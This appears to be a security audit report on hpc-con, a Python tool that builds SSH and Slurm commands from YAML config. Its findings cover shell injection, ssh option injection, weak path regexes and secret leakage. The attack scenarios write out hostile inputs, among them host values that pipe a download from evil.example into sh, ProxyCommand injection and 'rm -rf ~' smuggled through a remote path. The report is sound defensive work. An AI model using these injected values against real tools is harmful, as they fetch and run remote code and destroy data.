# Security report - hpc-con

## 1. Summary

- **Date:** 2026-10-17
- **Commit:** `8af1f47` (branch `feat/ssh-con`), **plus uncommitted working-tree changes**
  (`src/hpc_con/transport/ssh.py`, `src/hpc_con/transport/utils.py`, `main.py`,
  `pyproject.toml`, `uv.lock`, `example.yaml`, `tests/test_config.py`, untracked `kod.txt`)
- **Findings per severity:**

| Severity | Count |uv run python -m unittest discover -s tests -v   
|----------|-------|
| Critical | 0 |
| High     | 3 |
| Medium   | 1 |
| Low      | 6 |
| Info     | 4 |

- **Most important problem:** the working-tree transport code runs `ssh` through a local
  shell (`shell=True`) on a command built with f-strings from unvalidated YAML values
  (`connection.host`, `user`, `key_file`), so a crafted config runs arbitrary commands
  on the user's own machine.

Note: the transport package does not work at the moment. `hpc_con/transport/__init__.py`
imports `SSH_RemoteHost`, which no longer exists, so `import hpc_con.transport` raises
`ImportError`. Also, `execute_local_cmd` raises `TypeError` and `execute_remote_cmd` raises
`NameError`. Right now the CLI (`hpc-con`, `main.py`) only loads and prints the config, so
none of the transport findings can be reached yet. They are still rated by their impact
once the code is wired up, because the current design will be exploitable as soon as the
crashes are fixed.

---

## 2. Findings

### SEC-01: Local command injection in `SSHConnection.connect` (shell=True + f-string)

- **Severity:** High
- **Location:** `src/hpc_con/transport/ssh.py:17`, `:25`, `:35`, `:39-40`, `:42-44` (uncommitted)
- **Description:** `connect()` builds one string
  `f"ssh {user}@{host} -p {port} -i {key_file}"` and runs it with
  `sp.Popen(command, shell=True)`. The local `/bin/sh` parses every config value, and
  `connection.host` and `connection.user` are not validated at all (see SEC-03). This
  breaks the project rule "Never use shell=True. Pass commands to subprocess as lists."
  Other problems: `Popen` is never waited on or checked, and if `user` is unset the
  target is `None@host`.
- **Attack scenario:**
  ```yaml
  connection:
    host: "login.example.org; curl -s https://evil.example/x | sh #"
  ```
  The local shell runs `ssh None@login.example.org`, then runs `curl ... | sh` as the
  local user, before any connection is made. `user: "$(id>/tmp/pwned)"` works too. So
  does a `key_file` with metacharacters, as long as a file with that name exists, since
  only `os.path.isfile` is checked.
- **Proposed fix:** go back to an argv list without a shell, validate the connection
  fields (SEC-03) and end the options with `--`:
  ```python
  argv = ["ssh", "-o", "ControlPath=~/.ssh/cm-%C"]
  if cfg.port:
      argv += ["-p", str(cfg.port)]
  if cfg.key_file:
      argv += ["-i", cfg.key_file]
  argv += ["--", target]
  sp.run(argv, check=True)
  ```

### SEC-02: `execute_local_cmd` uses shell=True, `execute_remote_cmd` builds the command by string concatenation

- **Severity:** High
- **Location:** `src/hpc_con/transport/utils.py:19-30` (`shell=True` at `:23`), `:33-36` (uncommitted)
- **Description:**
  - `execute_local_cmd` calls `shlex.quote(command)` on a `list` (raises `TypeError`) and
    passes the result to `sp.run(..., shell=True)`. Even with a string it would be wrong:
    quoting the whole command makes it one word, and anything not quoted goes through the
    local shell.
  - `execute_remote_cmd` builds `f"{ssh_connection_commmand} {command}"` from two plain
    strings and passes it to the local shell (it also refers to the undefined name
    `remote_cmd_lstr`). The command goes through two shells, the local one and the
    remote login shell, and neither layer is quoted. This breaks the rules "commands as
    lists" and "remote command = one string built with `shlex.join(argv)`".
  - The committed version (HEAD, also copied in `kod.txt`) was list-based, but it passed
    `shlex.join(cmd)` as a string to `sp.run` without a shell, which would only work by
    accident, and it added the remote argv to the ssh argv unquoted (see SEC-04).
- **Attack scenario:** when this is used to submit a job, e.g.
  `execute_remote_cmd(base, f"sbatch {workdir}/job.sh")`, any config value or remote file
  name inside `command` with `;`, `$()`, a backtick or `|` runs locally (first shell) and
  then on the cluster login node (second shell).
- **Proposed fix:**
  ```python
  def execute_local_cmd(argv: list[str]) -> CommandExecutionResult:
      result = sp.run(argv, capture_output=True, text=True, check=True)  # no shell
      ...

  def execute_remote_cmd(ssh_base: list[str], argv: list[str]) -> CommandExecutionResult:
      # ssh_base must already end with "--", target
      return execute_local_cmd(ssh_base + [shlex.join(argv)])
  ```

### SEC-03: Connection fields are not validated, which allows ssh/scp option injection

- **Severity:** High
- **Location:** `src/hpc_con/config/consts.py:7-12` (type-only schema),
  `src/hpc_con/config/validation.py:38-59` (only `key_file` existence is checked),
  `src/hpc_con/transport/utils.py:39-46` (`build_ssh_base`, no `--`);
  committed `SSH_RemoteHost.put_file`/`fetch_file` (HEAD `transport/ssh.py`, `kod.txt:750-756`)
- **Description:** `host`, `user`, `port` and `key_file` are only type-checked. Nothing
  rejects a leading `-`, whitespace, `@`, `:` or shell metacharacters, and `port` has no
  range check. `build_ssh_base` and the scp calls put the target after the options
  without a `--` separator, so ssh/scp read a value starting with `-` as an option. The
  argv-list form (HEAD) is also affected, because option injection does not need a
  shell.
- **Attack scenario:**
  ```yaml
  connection:
    host: "-oProxyCommand=sh -c 'curl -s https://evil.example/x|sh'"
  ```
  With no `user`, the target is the host string itself. `ssh ... -oProxyCommand=... sbatch job.sh`
  reads it as an option and takes the next argv item (`sbatch`) as the host name. The
  ProxyCommand then runs locally. For scp,
  `["scp", local, "-oProxyCommand=...:remote"]` is read the same way. A `local_path` or
  `remote_path` starting with `-` (e.g. a job file named `-oProxyCommand=...`) can also
  inject options into `put_file`/`fetch_file`.
- **Proposed fix:** add a validation step for the `connection` section, next to the code
  that uses it, that collects all errors:
  ```python
  HOST_RE = re.compile(r"[A-Za-z0-9](?:[A-Za-z0-9.-]{0,252})", re.ASCII)   # no leading "-"
  USER_RE = re.compile(r"[a-z_][a-z0-9_.-]{0,31}", re.ASCII)
  # port: 1 <= port <= 65535
  # key_file: must not start with "-", must be a regular file, warn if mode & 0o077
  ```
  Use `fullmatch`. Also add `"--"` before the target in every ssh/scp argv
  (`[..., "--", target]`, `["scp", ..., "--", src, dst]`) and make local paths absolute
  (`os.path.abspath`) so they cannot start with `-`.

### SEC-04: Remote commands are not built with `shlex.join`

- **Severity:** Medium
- **Location:** HEAD `src/hpc_con/transport/utils.py` `execute_remote_cmd` (`ssh_base + cmd`,
  same in `kod.txt:793-796`); working tree `src/hpc_con/transport/utils.py:33-36`;
  scp remote paths `self.target + ":" + remote_path` (HEAD `ssh.py`, `kod.txt:752,756`)
- **Description:** ssh joins all argv items after the host with spaces and the remote
  shell splits them again. Adding a list (`ssh_base + ["mkdir", "-p", path]`) loses the
  quoting. With scp, the remote path also goes through remote shell or glob expansion.
- **Attack scenario:** `run(["cat", "out; rm -rf ~"])` runs `rm -rf ~` on the cluster.
  Validated job paths (`PATH_RE`) block most of this today, but any later remote path
  that is not validated (job ID from output, file name returned by the cluster,
  user-supplied path) can inject commands.
- **Proposed fix:** always send one argument: `ssh_base + [shlex.join(argv)]`. For scp,
  quote the remote part (`f"{target}:{shlex.quote(remote_path)}"`) or use `scp -s`
  (SFTP mode) with paths validated by `PATH_RE`.

### SEC-05: `PATH_RE` allows `..`, absolute paths and a leading `-`

- **Severity:** Low
- **Location:** `src/hpc_con/job/validation.py:17`, used at `:36-38`
- **Description:** `workdir`, `output` and `error` may contain `..`, start with `/` or
  start with `-`. Inside `#SBATCH --opt=value` this cannot inject anything, but Slurm will
  write the job's stdout/stderr to any path the cluster account can write. When
  `workdir` is reused in remote commands (`mkdir -p`, `cd`, scp destination), a value
  like `-rf` or `--help` becomes an option.
- **Attack scenario:** `output: ../../.bashrc` makes the job's stdout replace the user's
  `~/.bashrc` on the cluster, so attacker-influenced output runs at the next login.
  `workdir: -rf` (or `--help`) passes `PATH_RE` and becomes an option in later
  `rm`/`mkdir`/`cd` remote calls (`=` is rejected, so `-oProxyCommand=...` does not pass).
- **Proposed fix:** reject a leading `-` and `..` path components, e.g.
  `PATH_RE = re.compile(r"(?!-)[A-Za-z0-9_./%-]+", re.ASCII)` plus
  `".." not in value.split("/")`. Decide whether absolute paths are allowed and document
  it. Always pass `--` before paths in remote commands.

### SEC-06: `TIME_RE` and `MEM_RE` use `\d`, which accepts Unicode digits

- **Severity:** Low
- **Location:** `src/hpc_con/job/validation.py:13-14`
- **Description:** In Python `str` patterns, `\d` matches any Unicode decimal digit.
  I confirmed that `TIME_RE.fullmatch("١٢:00")` and `MEM_RE.fullmatch("٥G")` both match.
  This cannot inject anything (no whitespace or metacharacters), but values that are not
  ASCII get into `#SBATCH` lines, and later code that trusts these patterns
  (e.g. `int(...)`) may behave in unexpected ways.
- **Proposed fix:** use `[0-9]` or compile every pattern with `re.ASCII`. Also drop the
  redundant `^`/`$` anchors, since `fullmatch` is already used (it is used correctly:
  `"abc\n"` is rejected).

### SEC-07: `MODULE_RE` allows a leading `-` (option injection into `module load`)

- **Severity:** Low
- **Location:** `src/hpc_con/job/validation.py:15`, `src/hpc_con/job/script.py:73`
- **Description:** `shlex.quote("--force")` returns `--force` unchanged, so
  `module load --force` or `module load -f` is passed to Lmod/Environment Modules as an
  option. `..` is also allowed.
- **Attack scenario:** `modules: ["--ignore-cache"]` or `["-q"]` changes how the module
  command behaves. The impact is small, but it goes against the "strict regex" rule.
- **Proposed fix:** `MODULE_RE = re.compile(r"[A-Za-z0-9_][A-Za-z0-9_.+/-]*", re.ASCII)`
  and write `module load -- {shlex.quote(m)}` (supported by Lmod), or reject `..`.

### SEC-08: Secrets can leak through printed config and debug tracing

- **Severity:** Low
- **Location:** `src/hpc_con/__init__.py:19`, `main.py:3`, `src/hpc_con/job/model.py:47`,
  `src/hpc_con/job/templates/slurm_job.txt:11-13`; HEAD `ssh.py` `_verbose_start/_verbose_end`
- **Description:** the CLI prints the whole parsed config, including every `env` value.
  Users often put `WANDB_API_KEY` or `HF_TOKEN` there. With `debug=1`, `set -x` writes
  every `export KEY=value` to the Slurm output file on the shared cluster filesystem,
  where it may be readable by the group. The verbose ssh helpers also copy the full
  stderr into exception messages.
- **Proposed fix:** mask env values in `__str__` (e.g. show only the keys, or
  `KEY=****` for keys matching `TOKEN|KEY|SECRET|PASSWORD`). Run `set -x` only after
  the `$setup` block, or wrap the exports in `set +x`/`set -x`. Document that `env`
  values end up in plain text in the batch script.

### SEC-09: SSH ControlMaster persists forever (`ControlPersist=yes`)

- **Severity:** Low
- **Location:** HEAD `src/hpc_con/transport/ssh.py` `__enter__` (`kod.txt:758-766`),
  `src/hpc_con/transport/utils.py:41`
- **Description:** the master connection is started with `ControlPersist=yes` (no
  timeout). If `__exit__` does not run (crash, `kill -9`, exception inside `__enter__`
  after `-MNf`), an authenticated master socket stays open with no time limit, and any
  local process of the same user can reuse it without re-authenticating. The ControlPath
  `~/.ssh/cm-%C` is fine (the user's `~/.ssh` is mode 700, and ssh expands `~` itself).
  Also, the binary name is a typo (`"shh"`) and `connection.target` does not exist on
  `ConnectionConfig`.
- **Proposed fix:** use `ControlPersist=10m` (or similar), add
  `-o ControlMaster=auto`, and make sure `-O exit` is sent in a `finally` block. (The
  current `["-o", "exit"]` is also wrong, it should be `-O exit`.)

### SEC-10: CI workflow has no `permissions:` block and actions are pinned by tag only

- **Severity:** Low
- **Location:** `.github/workflows/lint.yml:1-20` (`actions/checkout@v4` at `:17`,
  `astral-sh/setup-uv@v6` at `:20`)
- **Description:** without `permissions:`, the `GITHUB_TOKEN` gets the repository default
  permissions (possibly read/write). The actions are pinned to movable major tags, so a
  compromised tag would run with that token. The workflow uses `pull_request` (not
  `pull_request_target`) and references no secrets, so fork PRs cannot reach secrets.
- **Proposed fix:**
  ```yaml
  permissions:
    contents: read
  ```
  at the top level, pin actions by commit SHA (`actions/checkout@<sha> # v4`) and set
  `persist-credentials: false` on checkout.

### SEC-11: `commands` trust boundary is not clearly documented, and validation.py overstates its guarantee

- **Severity:** Info
- **Location:** `src/hpc_con/job/script.py:65-66`, `src/hpc_con/job/validation.py:1-6`,
  `README.md:87`
- **Description:** writing `commands` into the script as-is is intended. However, the
  docstring of `validation.py` says "Every value is matched against a strict pattern ...
  so it cannot inject extra lines or commands", and the README only says "lines at the
  end of the script". Nothing says that the YAML is equivalent to a shell script and must
  come only from trusted sources. `env` values are only safe because of `shlex.quote` and
  are not checked by a regex.
- **Proposed fix:** add a "Security / trust model" note to the README: the config file is
  code, `commands` run as-is on the cluster under your account, and you should never run
  configs you did not write. Update the `validation.py` docstring to list the fields that
  are on purpose not validated (`commands`, env values) and explain why.

### SEC-12: `render_script` is broken in ways that will invite unsafe "quick fixes"

- **Severity:** Info
- **Location:** `src/hpc_con/job/script.py:92-102`, `src/hpc_con/job/templates/slurm_job.txt:2,11`
- **Description:** `_construct_command()` is called without arguments (`TypeError`,
  confirmed), the template placeholder `$sbatch_header` does not match the keyword
  `sbtach_header`, `$DEBUG_MODE` in the template will raise `KeyError` in
  `Template.substitute`, and `_render_script_file(rendered_script)` is missing `filename`.
  `_render_script_file` also opens with `open(filename, "w")`, which follows symlinks and
  uses the default umask.
- **Proposed fix:** escape bash variables in the template as `$$DEBUG_MODE`, fix the names,
  keep using `substitute` (not `safe_substitute`) so a missing value fails loudly, and
  write the script with `os.open(path, O_WRONLY|O_CREAT|O_EXCL, 0o600)` or into a
  `tempfile.mkstemp` file.

### SEC-13: Untracked `kod.txt` contains a full copy of the source

- **Severity:** Info
- **Location:** `kod.txt` (repo root, untracked, not in `.gitignore`)
- **Description:** an 806-line dump of `pyproject.toml` and all source files, including
  the HEAD version of the transport code. It contains no secrets or keys (checked), but
  it can easily be committed by mistake and then get out of sync with the real code.
- **Proposed fix:** delete it, or add it to `.gitignore`.

### SEC-14: New runtime dependency `pydantic` added without review

- **Severity:** Info
- **Location:** `pyproject.toml` (uncommitted, `pydantic>=2.14.1`), `uv.lock`,
  `src/hpc_con/transport/utils.py:5`
- **Description:** AGENTS.md says dependencies must not be added without asking. pydantic
  2.14.1 / pydantic-core 2.50.1 have no known vulnerabilities (pip-audit). It is used for
  one plain result model, where a `dataclass` would be enough. All lock sources point to
  PyPI.
- **Proposed fix:** confirm with the maintainer, or replace `CommandExecutionResult` with a
  frozen dataclass and drop the dependency.

---

## 3. Checked and OK

- **YAML loading:** `yaml.safe_load` only (`config/loader.py:26`). No `yaml.load`,
  `eval`, `exec` or `os.system` anywhere in `src`.
- **Structural validation:** unknown keys are rejected, types are strict (`bool` is not
  accepted as `int`), and all errors are collected before raising.
- **Job regexes:** all use `pattern.fullmatch`, so a trailing newline is rejected
  (`NAME_RE.fullmatch("abc\n")` gives `None`). Whitespace, `;`, `$`, `` ` ``, `|` and
  `=` are not in any character class. `name`, `partition`, `account`, `time`, `mem`,
  `workdir`, `output`, `error`, `modules` and env keys are all checked. Integers
  (`nodes`, `ntasks`, `cpus_per_task`, `gpus`) are type- and range-checked.
  `validate_job` runs both in `read_config` and again in `render_script`.
- **Script body quoting:** module names and env values go through `shlex.quote`. Env
  keys are restricted to `[A-Za-z_][A-Za-z0-9_]*`. `string.Template` does not
  re-expand `$` inside substituted values.
- **Host key checking:** no `StrictHostKeyChecking=no` or `UserKnownHostsFile=/dev/null`
  anywhere.
- **ControlPath location:** `~/.ssh/cm-%C`, inside the user's private `~/.ssh` (mode 700
  on this machine).
- **Error messages:** `key_file` errors show only the path, never the file contents. YAML
  parse errors show a short snippet of the config, not of other files.
- **Secrets in repo/history:** `git log -p --all -S 'PRIVATE KEY'` only matches the agent
  instructions text. No passwords, tokens or keys were found in the 32 commits, the
  working tree or `kod.txt`. `example.yaml` and the tests only refer to the
  `~/.ssh/id_*` paths.
- **Tests:** use pyfakefs and do not contact real hosts.
- **CI secrets exposure:** the trigger is `pull_request` and no secrets are referenced.

---

## 4. Tool output

- **bandit** (`uv run --with bandit bandit -r src`): 4 findings.
  - `transport/ssh.py:40` HIGH B602 `shell=True`: real issue, see SEC-01.
  - `transport/utils.py:23` HIGH B602 `shell=True`: real issue, see SEC-02.
  - `transport/ssh.py:1`, `transport/utils.py:2` LOW B404 (subprocess import): not a
    finding by itself.
  - bandit does not detect option injection (SEC-03), remote quoting (SEC-04) or regex
    weaknesses (SEC-05 to SEC-07).
- **pip-audit** (`uvx pip-audit --disable-pip -r /tmp/hpc_con_req.txt` on the
  `uv export` of `uv.lock`): **No known vulnerabilities found.**
- **grep checks:** dangerous calls are only the two `shell=True` sites above. No
  host-key-checking overrides.
